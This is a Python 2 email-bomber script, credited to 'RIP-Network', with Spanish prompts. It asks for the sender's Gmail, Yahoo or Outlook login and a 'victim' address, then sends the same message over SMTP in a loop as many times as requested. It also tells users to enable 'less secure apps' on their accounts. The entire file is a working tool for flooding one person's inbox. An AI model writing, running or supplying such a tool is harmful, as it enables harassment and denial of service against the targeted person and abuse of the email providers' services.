#!/usr/bin/python
import smtplib
import time
import os
import getpass
import sys

class bcolors:
	OKGREEN = '\033[92m'
	WARNING = '\033[93m'
	FAIL = '\033[91m'
	ENDC = '\033[0m'


def bomb():
	os.system('clear')
	print bcolors.OKGREEN + '''
           _.od8888888bo._
        .dP"'   @#@   '"Yb.
       .d"'      #@#      '"b.   La Paz Nunca Fue Una Opcion.
      d"'        @#@        '"b
     d'          #@#          'b
    dP           @#@           Yb
    8l          oDWBo          l8
    Yb        o@#@B@#@o        dP
     YI     o@#* #P# *#@o     IP
      YI  o@#*   @#@   *#@o  IP
       "9@#*     #@#     *#@P"
        "8b     @#@     d8"
          `"Y888888888P"`''' + bcolors.ENDC


os.system('clear')
try:
	file1 = open('Banner.txt', 'r')
	print(' ')
	print bcolors.OKGREEN + file1.read() + bcolors.ENDC
	file1.close()
except IOError:
	print('Banner File not found')

#Input
print(bcolors.WARNING + '''
Created by RIP-Network  Version 2.5
1) Gmail
2) Yahoo
3) Hotmail/Outlook
''' + bcolors.ENDC + '--------------------------------------------------------------')
try:
	server = raw_input(bcolors.OKGREEN + 'Elige tu opcion: ' + bcolors.ENDC)
	user = raw_input(bcolors.OKGREEN + 'Tu Email: ' + bcolors.ENDC)
	pwd = getpass.getpass(bcolors.OKGREEN + 'Tu Password: ' + bcolors.ENDC)
	to = raw_input(bcolors.OKGREEN + 'Email de la victima: ' + bcolors.ENDC)
	subject = raw_input(bcolors.OKGREEN + 'Sujeto (Opcional): ' + bcolors.ENDC)
	body = raw_input(bcolors.OKGREEN + 'Mensage: ' + bcolors.ENDC)
	nomes = input(bcolors.OKGREEN + 'Cantidad para enviar: ' + bcolors.ENDC)
	no = 0
	message = 'From: ' + user + '\nSubject: ' + subject + '\n' + body
except KeyboardInterrupt:
	print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
	sys.exit()

#Gmail

if server == '1' or server == 'gmail' or server == 'Gmail':
	bomb()
	server = smtplib.SMTP("smtp.gmail.com", 587)
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Gmail: https://myaccount.google.com/lesssecureapps ''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Enviado ' + str(no+1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except:
			print "Error "
	server.close()
	
#Yahoo
elif server == '2' or server == 'Yahoo' or server == 'yahoo':
	server = smtplib.SMTP("smtp.mail.yahoo.com", 587)
	bomb()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + '''Your Username or Password is incorrect, please try again using the correct credentials
		Or you need to enable less secure apps
		On Yahoo: https://login.yahoo.com/account/security?.scrumb=Tiby8TXUvJt#less-secure-apps
		''' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Enviado ' + str(no + 1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except:
			print "Error"
	server.close()
	
#Hotmail/Outlook
elif server == '3' or server == 'outlook' or server == 'Outlook' or server == 'Hotmail' or server == 'hotmail':
	server = smtplib.SMTP("smtp-mail.outlook.com", 587)
	bomb()
	server.ehlo()
	server.starttls()
	try:
		server.login(user, pwd)
	except smtplib.SMTPAuthenticationError:
		print bcolors.FAIL + 'Your Username or Password is incorrect, please try again using the correct credentials' + bcolors.ENDC
		sys.exit()
	while no != nomes:
		try:
			server.sendmail(user, to, message)
			print bcolors.WARNING + 'Enviado ' + str(no + 1) + ' emails' + bcolors.ENDC
			no += 1
			time.sleep(.8)
		except KeyboardInterrupt:
			print bcolors.FAIL + '\nCanceled' + bcolors.ENDC
			sys.exit()
		except smtplib.SMTPAuthenticationError:
			print '\nThe username or password you entered is incorrect.'
			sys.exit()
		except:
			print "Error "
	server.close()
	
else:
	print 'Works only with Gmail, Yahoo, Outlook and Hotmail.'
	sys.exit()